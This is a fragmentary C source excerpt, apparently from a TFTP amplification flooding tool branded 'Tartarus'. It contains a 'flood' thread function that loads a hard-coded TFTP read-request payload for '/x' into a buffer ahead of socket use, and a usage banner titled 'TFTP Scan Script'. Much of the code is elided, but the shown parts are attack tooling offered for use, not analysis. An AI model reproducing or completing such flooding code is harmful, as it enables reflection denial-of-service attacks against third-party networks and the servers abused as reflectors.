...
void *flood(void *par1)
{
        ...
        memcpy(buf, "\x00\x01\x2f\x78\x00\x6e\x65\x74\x61\x73\x63\x69\x69\x00", 14);
        int sizeofpayload = 14;
        int sock;
...
{
        if(argc < 6){
                fprintf(stderr, "\e[38;5;93m[\e[38;5;202mTartarus\e[38;5;93m] \e[38;5;202mTFTP Scan Script\n");
